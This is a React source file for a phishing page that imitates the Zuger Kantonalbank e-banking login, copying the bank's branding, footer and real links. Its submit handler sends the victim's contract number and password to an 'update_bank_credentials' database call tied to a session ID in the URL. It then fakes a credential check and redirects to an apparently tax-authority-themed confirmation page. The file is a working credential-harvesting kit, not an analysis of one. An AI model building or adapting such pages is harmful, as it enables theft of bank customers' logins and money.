import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { ArrowRight, Facebook, Instagram, Linkedin } from "lucide-react";
import logoAsset from "@/assets/zuger-kantonalbank-logo.svg.asset.json";
import sloganAsset from "@/assets/zuger-kantonalbank-slogan.svg.asset.json";

const BLUE = "#0085ca";
const FOOTER_BG = "#204a77";
const BORDER = "#ced4da";
const BTN_GRAY = "#999fa1";

const FORGOT_URL =
  "https://wwwsec.ebanking.zugerkb.ch/authen/ui/app/self-service/select/flow/default-password-reset-flow";

const t = {
  de: {
    title: "Login E-Banking / Kundenportal",
    vertragsnummer: "Vertragsnummer",
    passwort: "Passwort",
    forgot: "Passwort vergessen ?",
    login: "Login",
    kundenzentrum: "Kundenzentrum",
    hours: "Montag bis Freitag von 8.00 - 18.00 Uhr",
    liveSupport: "Live-Support mit Berater starten",
    hilfe: "E-Banking Hilfe",
    cookie: "Cookie Policy",
    copyright: "© Zuger Kantonalbank",
    loading: "Anmeldedaten werden überprüft...",
  },
  en: {
    title: "Login E-Banking / Customer Portal",
    vertragsnummer: "Contract number",
    passwort: "Password",
    forgot: "Forgot password ?",
    login: "Login",
    kundenzentrum: "Customer center",
    hours: "Monday to Friday 8.00 a.m. - 6.00 p.m.",
    liveSupport: "Start live support with advisor",
    hilfe: "E-Banking Help",
    cookie: "Cookie Policy",
    copyright: "© Zuger Kantonalbank",
    loading: "Verifying credentials...",
  },
};

const quicklinks = (lang: "de" | "en") => [
  { label: t[lang].liveSupport, href: "#" },
  { label: t[lang].hilfe, href: "https://www.zugerkb.ch/e-banking-hilfe" },
  { label: t[lang].cookie, href: "https://www.zugerkb.ch/cookie-policy" },
];

const socials: { href: string; render: () => JSX.Element }[] = [
  {
    href: "https://www.facebook.com/zugerkb",
    render: () => <Facebook size={16} color={FOOTER_BG} fill={FOOTER_BG} />,
  },
  {
    href: "https://www.instagram.com/zugerkb",
    render: () => <Instagram size={16} color={FOOTER_BG} />,
  },
  {
    href: "https://www.youtube.com/channel/UCRsMmDENF4-WbBNUTZ2an8w",
    render: () => <YoutubeIcon />,
  },
  {
    href: "https://www.linkedin.com/company/zuger-kantonalbank",
    render: () => <Linkedin size={16} color={FOOTER_BG} fill={FOOTER_BG} />,
  },
  {
    href: "https://www.xing.com/companies/zugerkantonalbank",
    render: () => <XingIcon />,
  },
];

function XingIcon({ color = FOOTER_BG, size = 16 }: { color?: string; size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" fill={color} xmlns="http://www.w3.org/2000/svg">
      <path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.539l-4.879-8.916c-.004-.006-.004-.016 0-.022L21.235.756c.095-.193.097-.387.006-.539C21.151.08 20.987 0 20.775 0h-2.587zM3.648 4.74c-.211 0-.385.074-.475.222-.092.151-.078.347.02.541l2.336 4.05c.005.01.005.014 0 .022L1.86 16.527c-.099.193-.093.387 0 .538.092.149.245.241.455.241h3.463c.516 0 .766-.348.945-.667l3.733-6.609-2.378-4.155c-.172-.315-.435-.664-.965-.664H3.648z" />
    </svg>
  );
}

function YoutubeIcon({ color = FOOTER_BG, size = 16 }: { color?: string; size?: number }) {
  return (
    <svg width={size} height={size} viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
      <path fill={color} d="M23.5 6.2a3 3 0 0 0-2.1-2.1C19.6 3.6 12 3.6 12 3.6s-7.6 0-9.4.5A3 3 0 0 0 .5 6.2C0 8 0 12 0 12s0 4 .5 5.8a3 3 0 0 0 2.1 2.1c1.8.5 9.4.5 9.4.5s7.6 0 9.4-.5a3 3 0 0 0 2.1-2.1C24 16 24 12 24 12s0-4-.5-5.8z" />
      <polygon fill="#fff" points="9.6,15.6 16,12 9.6,8.4" />
    </svg>
  );
}

const SocialCircle = ({ href, children }: { href: string; children: React.ReactNode }) => (
  <a
    href={href}
    target="_blank"
    rel="noopener noreferrer"
    className="w-8 h-8 rounded-full bg-white flex items-center justify-center hover:opacity-80 transition"
  >
    {children}
  </a>
);

const ChZugerKantonalbank = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<"de" | "en">("de");

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Zuger Kantonalbank – E-Banking", logoAsset.url);

  const L = t[lang];

  const handleSubmit = async () => {
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  const inputClasses =
    "md:col-span-2 w-full px-3 py-2.5 bg-white border rounded-[2px] text-[15px] outline-none transition-shadow focus:outline-2 focus:[outline-style:solid] focus:outline-[#0085ca] focus:-outline-offset-2 focus:shadow-[0_0_10px_2px_rgba(0,0,0,0.35)]";

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message={L.loading}
          onComplete={() => navigate("/estv/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white">
        {/* Header */}
        <header className="w-full bg-white">
          <div className="w-full px-6 md:px-24 py-5 flex flex-col gap-3 md:flex-row md:items-end md:justify-between">
            <div className="flex items-end gap-6">
              <img src={logoAsset.url} alt="Zuger Kantonalbank" className="h-9" />
              <img src={sloganAsset.url} alt="Wir begleiten Sie im Leben." className="hidden sm:block h-3 mb-1.5" />
            </div>
            <nav className="flex items-center gap-6 text-[14px] self-end md:mb-1">
              <button
                type="button"
                onClick={() => setLang("de")}
                className={lang === "de" ? "text-[#999]" : "text-black"}
              >
                Deutsch
              </button>
              <button
                type="button"
                onClick={() => setLang("en")}
                className={lang === "en" ? "text-[#999]" : "text-black"}
              >
                English
              </button>
            </nav>
          </div>
        </header>

        {/* Divider Header → Body (full width, aligned with header padding) */}
        <div className="w-full px-4 md:px-24">
          <div className="border-t border-[#e5e5e5]" />
        </div>

        {/* Body */}
        <main className="w-full flex-1 bg-white">
          <div className="w-full px-6 md:px-24 py-2">
            <div className="w-full md:w-3/5">
              <h1
                className="text-[36px] font-light my-8 leading-tight"
                style={{ color: BLUE }}
              >
                {L.title}
              </h1>

              <div className="border-t border-[#e5e5e5]" />

              <div className="py-8">
                <div className="grid grid-cols-1 md:grid-cols-3 gap-y-4 md:gap-x-6 items-center">
                  <label className="text-[15px] text-[#555]" htmlFor="vertragsnummer">
                    {L.vertragsnummer}
                  </label>
                  <input
                    id="vertragsnummer"
                    type="text"
                    value={vertragsnummer}
                    onChange={(e) => setVertragsnummer(e.target.value)}
                    className={inputClasses}
                    style={{ borderColor: BORDER }}
                  />

                  <label className="text-[15px] text-[#555]" htmlFor="passwort">
                    {L.passwort}
                  </label>
                  <input
                    id="passwort"
                    type="password"
                    value={passwort}
                    onChange={(e) => setPasswort(e.target.value)}
                    className={inputClasses}
                    style={{ borderColor: BORDER }}
                  />

                  <div className="hidden md:block" />
                  <div className="md:col-span-2 flex justify-end mt-2">
                    <a
                      href={FORGOT_URL}
                      target="_blank"
                      rel="noopener noreferrer"
                      className="text-[14px]"
                      style={{ color: BLUE }}
                    >
                      {L.forgot}
                    </a>
                  </div>

                  <div className="hidden md:block" />
                  <div className="md:col-span-2 mt-4">
                    <button
                      onClick={handleSubmit}
                      className="w-full text-white text-[15px] rounded-[2px] py-1.5 transition-colors"
                      style={{ backgroundColor: BTN_GRAY }}
                      onMouseEnter={(e) => {
                        const filled = vertragsnummer.trim() && passwort.trim();
                        if (filled) e.currentTarget.style.backgroundColor = BLUE;
                      }}
                      onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = BTN_GRAY)}
                    >
                      {L.login}
                    </button>
                  </div>
                </div>
              </div>

              <div className="border-t border-[#e5e5e5]" />
            </div>
          </div>

          {/* Spacer: viel Platz bis Footer */}
          <div className="h-48 md:h-72" />
        </main>

        {/* Footer */}
        <footer className="w-full" style={{ backgroundColor: FOOTER_BG }}>
          <div className="w-full px-4 md:px-24 py-10 text-white grid grid-cols-1 md:grid-cols-2 gap-8">

            {/* Left column */}
            <div className="text-[14px]">
              <div className="font-semibold text-[15px] mb-2">{L.kundenzentrum}</div>
              <div>{L.hours}</div>
              <ul className="mt-5 space-y-1.5">
                {quicklinks(lang).map((l) => (
                  <li key={l.label}>
                    <a
                      href={l.href}
                      target={l.href.startsWith("http") ? "_blank" : undefined}
                      rel={l.href.startsWith("http") ? "noopener noreferrer" : undefined}
                      className="flex items-center gap-2 transition-colors hover:text-[#7fb8e0]"
                    >
                      <ArrowRight size={14} />
                      <span>{l.label}</span>
                    </a>
                  </li>
                ))}
              </ul>
            </div>

            {/* Right column */}
            <div className="flex flex-col md:items-end gap-4 text-[14px]">
              <div>{L.copyright}</div>
              <div className="flex items-center gap-3">
                {socials.map((s) => (
                  <SocialCircle key={s.href} href={s.href}>{s.render()}</SocialCircle>
                ))}
              </div>
            </div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChZugerKantonalbank;
